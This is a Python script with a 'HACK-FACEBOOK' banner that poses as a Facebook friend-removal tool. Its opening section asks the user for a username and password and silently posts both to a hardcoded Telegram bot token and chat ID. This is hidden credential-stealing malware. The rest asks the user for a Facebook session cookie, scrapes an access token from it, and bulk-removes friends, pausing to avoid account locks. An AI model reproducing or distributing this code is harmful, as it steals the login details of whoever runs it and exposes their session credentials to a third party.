import requests as r
import os,sys
import time
time.sleep(0.01)
os.system('clear')
print('''\033[1;33m
████████████████████████████████████████
████████████████████████████████████████
██████▀░░░░░░░░▀████████▀▀░░░░░░░▀██████
████▀░░░░░░░░░░░░▀████▀░░░░░░░░░░░░▀████
██▀░░░░░░░░░░░░░░░░▀▀░░░░░░░░░░░░░░░░▀██
██░░░░░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░░█░█░░░░░░░░░░░░░░░██
██░░░░░░░░░░░░░░░░░▄▀░█░░░░░░░░░░░░░░░██
██░░░░░░░░░░████▄▄▄▀░░▀▀▀▀▄░░░░░░░░░░░██
██▄░░░░░░░░░████░░░░░░░░░░█░░░░░░░░░░▄██
████▄░░░░░░░████░░░░░░░░░░█░░░░░░░░▄████
██████▄░░░░░████▄▄▄░░░░░░░█░░░░░░▄██████
████████▄░░░▀▀▀▀░░░▀▀▀▀▀▀▀░░░░░▄████████
██████████▄░░░░░░░░░░░░░░░░░░▄██████████
████████████▄░░░░░░░░░░░░░░▄████████████
██████████████▄░░░░░░░░░░▄██████████████
████████████████▄░░░░░░▄████████████████
██████████████████▄▄▄▄██████████████████
████████████████████████████████████████
████████████████████████████████████████
''')
print('''\033[1;31m
█░█ ▄▀█ █▀▀ █▄▀ ▄▄ █▀▀ ▄▀█ █▀▀ █▀▀ █▄▄ █▀█ █▀█ █▄▀
█▀█ █▀█ █▄▄ █░█ ░░ █▀░ █▀█ █▄▄ ██▄ █▄█ █▄█ █▄█ █░█
''')
print('\033[1;32m-'*50)
us = input('\033[1;33mEnter username  : ')
pas = input('\033[1;35mEnter password : ')
bot_token = '6239664456:AAHifn8M0K71o_zgxGerdudQUeqxkwVTqyU'
url = "https://api.telegram.org/bot{}/sendMessage".format(bot_token)
values = {
'chat_id':'5521247573',
'text':'username : ' +us+
'\npassword : ' +pas 
}
res = r.post(url, data=values)
import requests, re, time
from bs4 import BeautifulSoup

url = (lambda x: "https://mbasic.facebook.com/removefriend.php?friend_id={}&unref=profile_gear".format(x))
names = (lambda x: " \_Remove > {}".format(x))
cookies = {"cookie":None}

def convert(cookie):
	cookies["cookie"] = cookie
	res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
   	     'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
    	    'referer': 'https://www.facebook.com/',
   	     'host' : 'business.facebook.com',
    	    'origin' : 'https://business.facebook.com',
   	     'upgrade-insecure-requests' : '1',
    	    'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        	'cache-control' : 'max-age=0',
    	    'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    	    'content-type' : 'text/html; charset=utf-8'
	    }, cookies = cookies)
	try:
		token = re.search('(EAAG\w+)',res.text).group(1)
	except:
		token = "cookies invalid"
	finally:
		return token

class Main:
	
	def __init__(self,id,name,cookie):
		self.id, self.name, self.cookie = id, name, {"cookie":cookie}
	
	def remove(self,**kwargs):
		with requests.Session() as session:
			return session.post("https://mbasic.facebook.com"+str(kwargs["url"]), cookies=self.cookie, data=kwargs["data"]).status_code

class Get(Main):

	@property
	def get(self):
		count = 0
		with requests.Session() as session:
			for i,j in zip(list(map(url,self.id)), list(map(names,self.name))):
				count += 1
				res = BeautifulSoup(session.get(i, cookies=self.cookie).text, "html.parser")
				form = res.find("form",{"method":"post"})
				data = {x.get("name"):x.get("value") for x in form.findAll("input",{"type":["hidden","submit"]})}
				if str(self.remove(url=form.get("action"),data=data))!="200":
					exit(" >< Invalid Remove ><")
				else:
					if count % 50 == 0:
						print(" >< To avoid the account being locked, every 50 id will sleep time for 5 seconds ><")
						time.sleep(5)
					else:
						print(j,f"\t _/\_{count}")
		return {"program":"finished"}

if __name__=="__main__":
	__import__("os").system("clear")
	print("\t ! input your cookie facebook account")
	coki = input(" > Cookie: ")
	token = convert(coki)
	if token=="cookies invalid":
		exit(" >< Maybe, your cookies invalid ><")
	__info = requests.get("https://graph.facebook.com/me?fields=name,id&access_token={}".format(token), cookies={"cookie":coki}).json()
	_data = requests.get(f"https://graph.facebook.com/{__info['id']}?fields=friends.fields(id,name)&access_token={token}", cookies={"cookie":coki}).json()
	id, name = [],[]
	for x in _data["friends"]["data"]:
		id.append(x['id'])
		name.append(x['name'])
	print(
		"\n > Name {}\n > Id {}\n > Count friends {}\n".format(
			__info["name"], __info["id"], len(id)
		)
	)
	count = int(input(f" > how much will be deleted? (1-{len(id)}) "))
	print(
		"\n\t\t+ program starts, (CTRL + C) to stoped +\n"
	)
	if count > len(id):
		exit(f" Your Friends only {len(id)}!")
	else:
		id = id[0:count]
		try:
			Debug = Get(id,name,coki)
			Debug.get
		except KeyboardInterrupt:
			exit(" >< program stoped ><")
	print(
		"\n >< [program finished], success remove {} friends ><".format(count)
	)
